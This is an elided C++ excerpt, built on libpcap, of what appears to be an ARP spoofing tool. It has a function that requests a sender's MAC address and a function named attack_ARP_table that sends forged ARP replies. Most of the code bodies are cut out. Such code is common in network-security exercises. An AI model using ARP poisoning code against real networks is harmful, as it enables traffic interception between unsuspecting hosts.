...
int request_arp_for_sender_mac(pcap_t* handle, Mac* interface_mac, Mac* sender_mac, std::string sender_ip, Ip* interface_ip) {
    ...
    int res = pcap_sendpacket(handle, (const u_char*)&req_packet, sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "Failed to send ARP request: %d, %s\n", res, pcap_geterr(handle));
        return -1;
    }
    ...
    while (true) {
        ...
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("Error receiving packet: %d, %s\n", res, pcap_geterr(handle));
            return -1;
        }

        EthHdr* res_eth_packet = (EthHdr*)packet;
        ArpHdr* res_arp_packet = (ArpHdr*)(packet + sizeof(EthHdr));
        ...
        printf("Received ARP packet - Sender IP: %s, Target IP: %s\n",
...
int attack_ARP_table(pcap_t* handle, Mac* sender_mac, std::string sender_ip, Mac* interface_mac, std::string target_ip) {
    ...
    if (res != 0) {
        fprintf(stderr, "Failed to send ARP reply: %d, %s\n", res, pcap_geterr(handle));
        return -1;
    }
